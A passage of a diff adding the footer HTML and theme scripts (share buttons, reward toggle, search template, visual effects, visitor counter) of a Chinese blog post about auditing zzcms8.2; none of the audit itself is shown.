+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/58925/&title=《代码审计--zzcms8.2》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/58925/&title=《代码审计--zzcms8.2》 — Somnus's blog&source=记录zzcms8.2审计过程以及漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/58925/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--zzcms8.2》 — Somnus's blog&url=https://Foxgrin.github.io/posts/58925/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/58925/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABwUlEQVR42u3aQY4CIAwFUO9/aecAjvhLoWMmj5UxCA8XDW15POLxjMfr/PVqjxsDFxe3zd3b/nWz9Tf5+u/m4OLiznPfRYz1nBy3DmSJARcX9/u5a0p+M8HFxf1/3GoIqwZKXFzcv+XmgSYPXsnBLuZquLi4DW5epbz3+Up9FxcXd4v7LI69RGivSPrLr3BxcUe41WJocvXpF0k//BG4uLjj3Dz9yINXcm0qrICLizvCrRZP80WTMNcqjuDi4l7gnmqj3iiD/rImLi7uCHe9QSecJZeb5BiF5AcXF/cot5OK7CVOeyUYXFzcSW71YVbSFOkce7O+i4uLe41baHYmF5HgGlRu6+Li4l7mdtoke4lTEhDf/goXF3eEWy15nHqStVkqxcXFHeTutUuT1CVJoqrBDhcX9xu41XTo1DXoQ66Gi4s7zu0kKvn8JPBtdmhxcXEb3Gdx9BOeagMGFxd3nrv3JCIPXknZpdxkxcXFHeGWu7JB2KqmSfmxcXFxJ7l7D7NOPdEoBEdcXNwv5ra2LPZMDwQyXFzcEW5eKClXcNfzcXFxB7mdVko1Taq2XnBxcee5B/q0jRtIXqbBxcUd4f4AcXjiMT9MPwsAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
